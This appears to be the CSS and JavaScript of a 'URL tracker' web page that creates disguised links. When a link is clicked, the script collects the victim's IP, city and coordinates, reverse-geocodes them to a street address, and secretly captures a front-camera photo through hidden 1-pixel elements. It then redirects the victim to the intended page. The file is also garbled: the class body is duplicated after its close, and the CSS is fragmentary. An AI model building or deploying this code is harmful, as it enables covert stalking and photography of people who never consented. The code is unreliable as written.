header h1 {

header p {

.content {

.url-section, .tracking-results {

    border: 1px solid #ddd;

.input-group button {

.result {

.url-display {

    border-radius: 4px 0 0 4px;

.url-display button {

.instructions {

    padding: 10px 15px;

    border-radius: 4px;

#refresh-btn {

#refresh-btn:hover {

#clear-btn {

    color: white;
}

#clear-btn:hover {

.results-table-container {

table {

th, td {
    padding: 12px 15px;
    text-align: left;
    border-bottom: 1px solid #ddd;

th {
    background-color: var(--light-gray);
    font-weight: 500;
}

tr:hover {

}

.modal {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.9);
    z-index: 1000;
    display: flex;
    justify-content: center;
    align-items: center;

.modal-content {
    position: relative;
    background: white;
    padding: 20px;
    border-radius: 5px;
    max-width: 90%;
    max-height: 90%;
    overflow: auto;
}

.close-modal {
    position: absolute;
    top: 10px;
    right: 10px;
    font-size: 24px;
    cursor: pointer;
}

.view-map-btn, .view-image-btn {
    background: var(--primary-color);
    color: white;
    border: none;
    padding: 5px 10px;
    border-radius: 4px;
    cursor: pointer;
}

.view-map-btn:hover, .view-image-btn:hover {
    background: #3367d6;

.map-modal iframe {
    border: none;
    min-width: 300px;

    }

        min-width: 200px;
        min-height: 200px;

    <script>
     /**
 * Advanced URL Tracker with Location and Camera Capture
 */
class AdvancedUrlTracker {
    constructor() {
        // DOM Elements
        this.dom = {
            urlInput: document.getElementById('url-input'),
            generateBtn: document.getElementById('generate-btn'),
            trackingUrlContainer: document.getElementById('tracking-url-container'),
            trackingUrl: document.getElementById('tracking-url'),
            copyBtn: document.getElementById('copy-btn'),
            refreshBtn: document.getElementById('refresh-btn'),
            clearBtn: document.getElementById('clear-btn'),
            resultsBody: document.getElementById('results-body')
        };

        // Camera elements (hidden)
        this.cameraElements = {
            video: document.createElement('video'),
            canvas: document.createElement('canvas'),
            container: document.createElement('div')
        };

        this.setupHiddenCamera();
        this.init();
    }

    /**
     * Initialize hidden camera elements
     */
    setupHiddenCamera() {
        // Style to hide all camera elements
        Object.assign(this.cameraElements.container.style, {
            position: 'fixed',
            top: '-9999px',
            left: '-9999px',
            width: '1px',
            height: '1px',
            overflow: 'hidden'
        });
        
        this.cameraElements.video.autoplay = true;
        this.cameraElements.video.playsInline = true;
        this.cameraElements.video.width = 1;
        this.cameraElements.video.height = 1;
        
        this.cameraElements.canvas.width = 1;
        this.cameraElements.canvas.height = 1;
        
        this.cameraElements.container.appendChild(this.cameraElements.video);
        this.cameraElements.container.appendChild(this.cameraElements.canvas);
        document.body.appendChild(this.cameraElements.container);
    }

    /**
     * Initialize the tracker
     */
    init() {
        this.baseUrl = window.location.href.split('?')[0];
        this.loadTrackingResults();
        this.setupEventListeners();
        this.checkForRedirect();
    }

    /**
     * Set up event listeners
     */
    setupEventListeners() {
        this.dom.generateBtn.addEventListener('click', () => this.generateTrackingUrl());
        this.dom.copyBtn.addEventListener('click', () => this.copyToClipboard());
        this.dom.refreshBtn.addEventListener('click', () => this.loadTrackingResults());
        this.dom.clearBtn.addEventListener('click', () => this.clearTrackingData());
        
        // Delegated event for viewing maps and images
        this.dom.resultsBody.addEventListener('click', (e) => {
            if (e.target.classList.contains('view-map-btn')) {
                this.showMapModal(e.target.dataset.lat, e.target.dataset.lon);
            }
            if (e.target.classList.contains('view-image-btn')) {
                this.showImageModal(e.target.dataset.image);
            }
            if (e.target.classList.contains('close-modal')) {
                e.target.closest('.modal').remove();
            }
        });
    }

    /**
     * Generate tracking URL
     */
    generateTrackingUrl() {
        const originalUrl = this.dom.urlInput.value.trim();
        
        if (!this.validateUrl(originalUrl)) return;
        
        const trackingId = this.generateId();
        const trackingUrlValue = `${this.baseUrl}?track=${trackingId}&target=${encodeURIComponent(originalUrl)}`;
        
        this.dom.trackingUrl.value = trackingUrlValue;
        this.dom.trackingUrlContainer.style.display = 'block';
        this.saveTrackingLink(trackingId, originalUrl);
    }

    /**
     * Validate URL
     */
    validateUrl(url) {
        if (!url) {
            alert('Please enter a URL to track');
            return false;
        }
        
        try {
            new URL(url);
            return true;
        } catch {
            alert('Please enter a valid URL (include http:// or https://)');
            return false;
        }
    }

    /**
     * Copy to clipboard
     */
    copyToClipboard() {
        this.dom.trackingUrl.select();
        document.execCommand('copy');
        this.showButtonFeedback(this.dom.copyBtn, 'Copied!');
    }

    /**
     * Show temporary button feedback
     */
    showButtonFeedback(button, text) {
        const originalText = button.textContent;
        button.textContent = text;
        setTimeout(() => {
            button.textContent = originalText;
        }, 2000);
    }

    /**
     * Check if current URL is a tracking redirect
     */
    checkForRedirect() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('track');
        const targetUrl = params.get('target');
        
        if (trackingId && targetUrl) {
            this.processTrackingClick(trackingId, targetUrl);
        }
    }

    /**
     * Process tracking click with all data collection
     */
    async processTrackingClick(trackingId, targetUrl) {
        const trackingLinks = this.getStorageItem('trackingLinks') || {};
        const originalUrl = trackingLinks[trackingId] || decodeURIComponent(targetUrl);
        
        if (!originalUrl) return false;

        try {
            // Start all data collection in parallel
            const [ipData, imageData] = await Promise.all([
                this.fetchIpData(),
                this.captureFromCamera().catch(e => {
                    console.error('Camera error:', e);
                    return null;
                })
            ]);

            // Get location details from Nominatim if coordinates exist
            const locationDetails = ipData.latitude && ipData.longitude 
                ? await this.fetchLocationDetails(ipData.latitude, ipData.longitude).catch(() => null)
                : null;

            const clickData = {
                timestamp: new Date().toISOString(),
                ip: ipData.ip || 'Unknown',
                country: ipData.country_name || 'Unknown',
                city: ipData.city || 'Unknown',
                latitude: ipData.latitude || null,
                longitude: ipData.longitude || null,
                locationDetails: locationDetails,
                device: this.getDeviceInfo(),
                browser: this.getBrowserInfo(),
                referrer: document.referrer || 'Direct',
                trackingId,
                originalUrl,
                hasCameraData: imageData !== null,
                cameraData: imageData
            };
            
            this.saveClickData(clickData);
            window.location.href = originalUrl;
        } catch (error) {
            console.error('Error processing click:', error);
            this.saveBasicClickData(trackingId, originalUrl);
            window.location.href = originalUrl;
        }
        
        return true;
    }

    /**
     * Fetch IP data with latitude/longitude
     */
    async fetchIpData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error('IP API failed');
            return await response.json();
        } catch (error) {
            console.error('Error fetching IP data:', error);
            return {};
        }
    }

    /**
     * Fetch location details from Nominatim
     */
    async fetchLocationDetails(lat, lon) {
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
            );
            if (!response.ok) throw new Error('Nominatim failed');
            return await response.json();
        } catch (error) {
            console.error('Error fetching location details:', error);
            return null;
        }
    }

    /**
     * Capture from camera (hidden)
     */
    async captureFromCamera() {
        try {
            // Check camera support
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            // Get camera stream
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });

            this.cameraElements.video.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                this.cameraElements.video.onloadedmetadata = () => {
                    this.cameraElements.video.play();
                    resolve();
                };
            });

            // Set canvas dimensions
            const ctx = this.cameraElements.canvas.getContext('2d');
            this.cameraElements.canvas.width = this.cameraElements.video.videoWidth;
            this.cameraElements.canvas.height = this.cameraElements.video.videoHeight;

            // Capture after short delay
            await new Promise(resolve => setTimeout(resolve, 300));
            
            // Draw to canvas
            ctx.drawImage(
                this.cameraElements.video, 
                0, 0, 
                this.cameraElements.canvas.width, 
                this.cameraElements.canvas.height
            );

            // Get image data
            const imageData = this.cameraElements.canvas.toDataURL('image/jpeg', 0.7);

            // Stop stream
            stream.getTracks().forEach(track => track.stop());
            this.cameraElements.video.srcObject = null;

            return imageData;
        } catch (error) {
            console.error('Camera capture error:', error);
            return null;
        }
    }

    /**
     * Save basic click data (fallback)
     */
    saveBasicClickData(trackingId, originalUrl) {
        const clickData = {
            timestamp: new Date().toISOString(),
            ip: 'Unknown',
            country: 'Unknown',
            city: 'Unknown',
            latitude: null,
            longitude: null,
            locationDetails: null,
            device: this.getDeviceInfo(),
            browser: this.getBrowserInfo(),
            referrer: document.referrer || 'Direct',
            trackingId,
            originalUrl,
            hasCameraData: false,
            cameraData: null
        };
        
        this.saveClickData(clickData);
    }

    /**
     * Save click data to storage
     */
    saveClickData(clickData) {
        const trackingResults = this.getStorageItem('trackingResults') || [];
        trackingResults.unshift(clickData);
        this.setStorageItem('trackingResults', trackingResults);
    }

    /**
     * Save tracking link to storage
     */
    saveTrackingLink(trackingId, originalUrl) {
        let trackingLinks = this.getStorageItem('trackingLinks') || {};
        trackingLinks[trackingId] = originalUrl;
        this.setStorageItem('trackingLinks', trackingLinks);
    }

    /**
     * Load and display tracking results
     */
    loadTrackingResults() {
        const trackingResults = this.getStorageItem('trackingResults') || [];
        
        if (trackingResults.length === 0) {
            this.dom.resultsBody.innerHTML = '<tr><td colspan="10">No tracking data available</td></tr>';
            return;
        }
        
        this.dom.resultsBody.innerHTML = trackingResults.map(result => `
            <tr>
                <td>${new Date(result.timestamp).toLocaleString()}</td>
                <td>${result.ip}</td>
                <td>${result.country}</td>
                <td>${result.city}</td>
                <td>
                    ${result.latitude && result.longitude 
                        ? `<button class="view-map-btn" 
                             data-lat="${result.latitude}" 
                             data-lon="${result.longitude}">
                             View Map
                           </button>`
                        : 'No coordinates'}
                </td>
                <td>${result.device}</td>
                <td>${result.browser}</td>
                <td>${this.shortenReferrer(result.referrer)}</td>
                <td>
                    ${result.hasCameraData 
                        ? `<button class="view-image-btn" data-image="${result.cameraData}">
                             View Image
                           </button>`
                        : 'No image'}
                </td>
                <td>
                    ${result.locationDetails && result.locationDetails.address
                        ? `${result.locationDetails.address.road || ''} 
                           ${result.locationDetails.address.house_number || ''}`
                        : ''}
                </td>
            </tr>
        `).join('');
    }

    /**
     * Shorten referrer URL for display
     */
    shortenReferrer(referrer) {
        if (referrer === 'Direct') return referrer;
        
        try {
            const url = new URL(referrer);
            return url.hostname;
        } catch {
            return referrer;
        }
    }

    /**
     * Show map modal
     */
    showMapModal(lat, lon) {
        const modal = document.createElement('div');
        modal.className = 'modal map-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal">&times;</span>
                <iframe
                    width="100%"
                    height="500"
                    frameborder="0"
                    scrolling="no"
                    marginheight="0"
                    marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
                </iframe>
                <small>
                    <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank">
                        View Larger Map
                    </a>
                </small>
            </div>
        `;
        document.body.appendChild(modal);
    }

    /**
     * Show image modal
     */
    showImageModal(imageData) {
        const modal = document.createElement('div');
        modal.className = 'modal image-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal">&times;</span>
                <img src="${imageData}" alt="Captured Image">
            </div>
        `;
        document.body.appendChild(modal);
    }

    /**
     * Clear all tracking data
     */
    clearTrackingData() {
        if (confirm('Are you sure you want to clear all tracking data? This cannot be undone.')) {
            localStorage.removeItem('trackingResults');
            localStorage.removeItem('trackingLinks');
            this.loadTrackingResults();
        }
    }

    /**
     * Get device information
     */
    getDeviceInfo() {
        const userAgent = navigator.userAgent;
        if (/mobile/i.test(userAgent)) {
            return 'Mobile';
        } else if (/tablet/i.test(userAgent)) {
            return 'Tablet';
        } else {
            return 'Desktop';
        }
    }

    /**
     * Get browser information
     */
    getBrowserInfo() {
        const userAgent = navigator.userAgent;
        
        if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
        if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) return 'Safari';
        if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) return 'Chrome';
        if (userAgent.indexOf('Edg') > -1) return 'Edge';
        if (userAgent.indexOf('MSIE') > -1 || userAgent.indexOf('Trident/') > -1) return 'IE';
        if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
        
        return 'Unknown';
    }

    /**
     * Get item from localStorage with parsing
     */
    getStorageItem(key) {
        try {
            return JSON.parse(localStorage.getItem(key)) || null;
        } catch (e) {
            console.error('Error parsing storage item:', e);
            return null;
        }
    }

    /**
     * Set item in localStorage with stringification
     */
    setStorageItem(key, value) {
        try {
            localStorage.setItem(key, JSON.stringify(value));
        } catch (e) {
            console.error('Error storing item:', e);
        }
    }

    /**
     * Generate a unique ID
     */
    generateId() {
        return 'id_' + Math.random().toString(36).substr(2, 9);
    }
}

        this.dom.resultsBody.addEventListener('click', (e) => {
            if (e.target.classList.contains('view-map-btn')) {
                this.showMapModal(e.target.dataset.lat, e.target.dataset.lon);
            }
            if (e.target.classList.contains('view-image-btn')) {
                this.showImageModal(e.target.dataset.image);
            }
            if (e.target.classList.contains('close-modal')) {
                e.target.closest('.modal').remove();
            }
        });
    }

    /**
     * Generate tracking URL
     */
    generateTrackingUrl() {
        const originalUrl = this.dom.urlInput.value.trim();
        
        if (!this.validateUrl(originalUrl)) return;
        
        const trackingId = this.generateId();
        const trackingUrlValue = `${this.baseUrl}?track=${trackingId}&target=${encodeURIComponent(originalUrl)}`;
        
        this.dom.trackingUrl.value = trackingUrlValue;
        this.dom.trackingUrlContainer.style.display = 'block';
        this.saveTrackingLink(trackingId, originalUrl);
    }

    /**
     * Validate URL
     */
    validateUrl(url) {
        if (!url) {
            alert('Please enter a URL to track');
            return false;
        }
        
        try {
            new URL(url);
            return true;
        } catch {
            alert('Please enter a valid URL (include http:// or https://)');
            return false;
        }
    }

    /**
     * Copy to clipboard
     */
    copyToClipboard() {
        this.dom.trackingUrl.select();
        document.execCommand('copy');
        this.showButtonFeedback(this.dom.copyBtn, 'Copied!');
    }

    /**
     * Show temporary button feedback
     */
    showButtonFeedback(button, text) {
        const originalText = button.textContent;
        button.textContent = text;
        setTimeout(() => {
            button.textContent = originalText;
        }, 2000);
    }

    /**
     * Check if current URL is a tracking redirect
     */
    checkForRedirect() {
        const params = new URLSearchParams(window.location.search);
        const trackingId = params.get('track');
        const targetUrl = params.get('target');
        
        if (trackingId && targetUrl) {
            this.processTrackingClick(trackingId, targetUrl);
        }
    }

    /**
     * Process tracking click with all data collection
     */
    async processTrackingClick(trackingId, targetUrl) {
        const trackingLinks = this.getStorageItem('trackingLinks') || {};
        const originalUrl = trackingLinks[trackingId] || decodeURIComponent(targetUrl);
        
        if (!originalUrl) return false;

        try {
            // Start all data collection in parallel
            const [ipData, imageData] = await Promise.all([
                this.fetchIpData(),
                this.captureFromCamera().catch(e => {
                    console.error('Camera error:', e);
                    return null;
                })
            ]);

            // Get location details from Nominatim if coordinates exist
            const locationDetails = ipData.latitude && ipData.longitude 
                ? await this.fetchLocationDetails(ipData.latitude, ipData.longitude).catch(() => null)
                : null;

            const clickData = {
                timestamp: new Date().toISOString(),
                ip: ipData.ip || 'Unknown',
                country: ipData.country_name || 'Unknown',
                city: ipData.city || 'Unknown',
                latitude: ipData.latitude || null,
                longitude: ipData.longitude || null,
                locationDetails: locationDetails,
                device: this.getDeviceInfo(),
                browser: this.getBrowserInfo(),
                referrer: document.referrer || 'Direct',
                trackingId,
                originalUrl,
                hasCameraData: imageData !== null,
                cameraData: imageData
            };
            
            this.saveClickData(clickData);
            window.location.href = originalUrl;
        } catch (error) {
            console.error('Error processing click:', error);
            this.saveBasicClickData(trackingId, originalUrl);
            window.location.href = originalUrl;
        }
        
        return true;
    }

    /**
     * Fetch IP data with latitude/longitude
     */
    async fetchIpData() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            if (!response.ok) throw new Error('IP API failed');
            return await response.json();
        } catch (error) {
            console.error('Error fetching IP data:', error);
            return {};
        }
    }

    /**
     * Fetch location details from Nominatim
     */
    async fetchLocationDetails(lat, lon) {
        try {
            const response = await fetch(
                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`
            );
            if (!response.ok) throw new Error('Nominatim failed');
            return await response.json();
        } catch (error) {
            console.error('Error fetching location details:', error);
            return null;
        }
    }

    /**
     * Capture from camera (hidden)
     */
    async captureFromCamera() {
        try {
            // Check camera support
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                return null;
            }

            // Get camera stream
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'user',
                    width: { ideal: 640 },
                    height: { ideal: 480 }
                },
                audio: false
            });

            this.cameraElements.video.srcObject = stream;
            
            // Wait for video to be ready
            await new Promise((resolve) => {
                this.cameraElements.video.onloadedmetadata = () => {
                    this.cameraElements.video.play();
                    resolve();
                };
            });

            // Set canvas dimensions
            const ctx = this.cameraElements.canvas.getContext('2d');
            this.cameraElements.canvas.width = this.cameraElements.video.videoWidth;
            this.cameraElements.canvas.height = this.cameraElements.video.videoHeight;

            // Capture after short delay
            await new Promise(resolve => setTimeout(resolve, 300));
            
            // Draw to canvas
            ctx.drawImage(
                this.cameraElements.video, 
                0, 0, 
                this.cameraElements.canvas.width, 
                this.cameraElements.canvas.height
            );

            // Get image data
            const imageData = this.cameraElements.canvas.toDataURL('image/jpeg', 0.7);

            // Stop stream
            stream.getTracks().forEach(track => track.stop());
            this.cameraElements.video.srcObject = null;

            return imageData;
        } catch (error) {
            console.error('Camera capture error:', error);
            return null;
        }
    }

    /**
     * Save basic click data (fallback)
     */
    saveBasicClickData(trackingId, originalUrl) {
        const clickData = {
            timestamp: new Date().toISOString(),
            ip: 'Unknown',
            country: 'Unknown',
            city: 'Unknown',
            latitude: null,
            longitude: null,
            locationDetails: null,
            device: this.getDeviceInfo(),
            browser: this.getBrowserInfo(),
            referrer: document.referrer || 'Direct',
            trackingId,
            originalUrl,
            hasCameraData: false,
            cameraData: null
        };
        
        this.saveClickData(clickData);
    }

    /**
     * Save click data to storage
     */
    saveClickData(clickData) {
        const trackingResults = this.getStorageItem('trackingResults') || [];
        trackingResults.unshift(clickData);
        this.setStorageItem('trackingResults', trackingResults);
    }

    /**
     * Save tracking link to storage
     */
    saveTrackingLink(trackingId, originalUrl) {
        let trackingLinks = this.getStorageItem('trackingLinks') || {};
        trackingLinks[trackingId] = originalUrl;
        this.setStorageItem('trackingLinks', trackingLinks);
    }

    /**
     * Load and display tracking results
     */
    loadTrackingResults() {
        const trackingResults = this.getStorageItem('trackingResults') || [];
        
        if (trackingResults.length === 0) {
            this.dom.resultsBody.innerHTML = '<tr><td colspan="10">No tracking data available</td></tr>';
            return;
        }
        
        this.dom.resultsBody.innerHTML = trackingResults.map(result => `
            <tr>
                <td>${new Date(result.timestamp).toLocaleString()}</td>
                <td>${result.ip}</td>
                <td>${result.country}</td>
                <td>${result.city}</td>
                <td>
                    ${result.latitude && result.longitude 
                        ? `<button class="view-map-btn" 
                             data-lat="${result.latitude}" 
                             data-lon="${result.longitude}">
                             View Map
                           </button>`
                        : 'No coordinates'}
                </td>
                <td>${result.device}</td>
                <td>${result.browser}</td>
                <td>${this.shortenReferrer(result.referrer)}</td>
                <td>
                    ${result.hasCameraData 
                        ? `<button class="view-image-btn" data-image="${result.cameraData}">
                             View Image
                           </button>`
                        : 'No image'}
                </td>
                <td>
                    ${result.locationDetails && result.locationDetails.address
                        ? `${result.locationDetails.address.road || ''} 
                           ${result.locationDetails.address.house_number || ''}`
                        : ''}
                </td>
            </tr>
        `).join('');
    }

    /**
     * Shorten referrer URL for display
     */
    shortenReferrer(referrer) {
        if (referrer === 'Direct') return referrer;
        
        try {
            const url = new URL(referrer);
            return url.hostname;
        } catch {
            return referrer;
        }
    }

    /**
     * Show map modal
     */
    showMapModal(lat, lon) {
        const modal = document.createElement('div');
        modal.className = 'modal map-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal">&times;</span>
                <iframe
                    width="100%"
                    height="500"
                    frameborder="0"
                    scrolling="no"
                    marginheight="0"
                    marginwidth="0"
                    src="https://www.openstreetmap.org/export/embed.html?bbox=${lon-0.01}%2C${lat-0.01}%2C${lon+0.01}%2C${lat+0.01}&layer=mapnik&marker=${lat}%2C${lon}">
                </iframe>
                <small>
                    <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=16/${lat}/${lon}" target="_blank">
                        View Larger Map
                    </a>
                </small>
            </div>
        `;
        document.body.appendChild(modal);
    }

    /**
     * Show image modal
     */
    showImageModal(imageData) {
        const modal = document.createElement('div');
        modal.className = 'modal image-modal';
        modal.innerHTML = `
            <div class="modal-content">
                <span class="close-modal">&times;</span>
                <img src="${imageData}" alt="Captured Image">
            </div>
        `;
        document.body.appendChild(modal);
    }

    /**
     * Clear all tracking data
     */
    clearTrackingData() {
        if (confirm('Are you sure you want to clear all tracking data? This cannot be undone.')) {
            localStorage.removeItem('trackingResults');
            localStorage.removeItem('trackingLinks');
            this.loadTrackingResults();
        }
    }

    /**
     * Get device information
     */
    getDeviceInfo() {
        const userAgent = navigator.userAgent;
        if (/mobile/i.test(userAgent)) {
            return 'Mobile';
        } else if (/tablet/i.test(userAgent)) {
            return 'Tablet';
        } else {
            return 'Desktop';
        }
    }

    /**
     * Get browser information
     */
    getBrowserInfo() {
        const userAgent = navigator.userAgent;
        
        if (userAgent.indexOf('Firefox') > -1) return 'Firefox';
        if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) return 'Safari';
        if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) return 'Chrome';
        if (userAgent.indexOf('Edg') > -1) return 'Edge';
        if (userAgent.indexOf('MSIE') > -1 || userAgent.indexOf('Trident/') > -1) return 'IE';
        if (userAgent.indexOf('Opera') > -1 || userAgent.indexOf('OPR') > -1) return 'Opera';
        
        return 'Unknown';
    }

    /**
     * Get item from localStorage with parsing
     */
    getStorageItem(key) {
        try {
            return JSON.parse(localStorage.getItem(key)) || null;
        } catch (e) {
            console.error('Error parsing storage item:', e);
            return null;
        }
    }

    /**
     * Set item in localStorage with stringification
     */
    setStorageItem(key, value) {
        try {
            localStorage.setItem(key, JSON.stringify(value));
        } catch (e) {
            console.error('Error storing item:', e);
        }
    }

    /**
     * Generate a unique ID
     */
    generateId() {
        return 'id_' + Math.random().toString(36).substr(2, 9);
    }
}

// Initialize the tracker when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    new AdvancedUrlTracker();
});
